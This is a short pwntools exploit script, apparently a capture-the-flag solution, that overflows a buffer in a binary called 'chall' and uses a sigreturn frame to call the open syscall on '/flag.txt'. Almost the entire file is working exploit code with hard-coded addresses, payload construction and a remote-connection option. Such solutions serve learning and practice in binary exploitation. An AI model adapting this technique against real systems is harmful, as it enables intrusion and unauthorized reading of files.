#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x4013F9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 24-8
    bss = 0x404010
    syscall = 0x4013f5
    filename = b"/flag.txt\x00"

    frame = SigreturnFrame()
    frame.rax = 0x2
    frame.rdi = 0x404040
    frame.rsi = 0x0
    frame.rip = syscall
    frame.rsp = 0xdeadbeef

    payload = flat({
        offset: [
            bss+0x40,
            exe.sym["main"]+28,
            b"A"*8,
            syscall,
            frame
        ]
    })

    io.sendline(payload)
    io.send(filename.ljust(0xf, b"\x00"))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

